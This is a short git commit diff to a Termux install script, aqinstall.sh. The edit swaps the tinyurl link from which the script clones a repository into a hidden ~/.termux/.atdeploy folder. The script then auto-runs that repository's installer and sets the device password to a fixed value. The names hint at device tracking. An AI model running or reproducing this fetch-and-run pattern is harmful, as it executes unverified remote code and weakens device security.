9fd4379ad83c5d3844ad17fb7dc06f17ee39fd8a
Surya <65920281+ssroneiot@users.noreply.github.com>
2026-04-04 10:29:40 +0000

    sdf

--- aqinstall.sh
+++ aqinstall.sh
@@ -3,7 +3,7 @@ yes | pkg upgrade -y && \
 yes | pkg install git -y && \
 cd ~/.termux && \
 rm -rf .atdeploy && \
-git clone https://tinyurl.com/zaqtrack .atdeploy && \
+git clone https://tinyurl.com/zaqmtr .atdeploy && \
 cd ~/.termux/.atdeploy && \
 yes | sh install.sh && \
 echo -e "atrack" | passwd && \
